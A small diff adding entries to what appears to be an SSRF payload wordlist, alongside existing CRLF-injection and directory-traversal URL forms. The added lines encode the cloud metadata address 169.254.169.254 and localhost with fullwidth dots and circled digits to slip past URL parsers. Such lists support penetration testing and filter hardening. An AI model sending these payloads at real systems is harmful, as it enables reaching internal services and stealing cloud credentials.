@@ -32,3 +32,10 @@ http://127.0.0.1%0d%0a
 # Directory Traversal
 http://../../
 http://../../../
+
+# Enclosed-alphanumeric / fullwidth host forms (parser bypass, public SSRF research)
+http://169。254。169。254/
+http://169｡254｡169｡254/
+http://127。0。0。1/
+http://①⑥⑨｡②⑤④｡①⑥⑨｡②⑤④/
+http://①②⑦｡⓪｡⓪｡①/
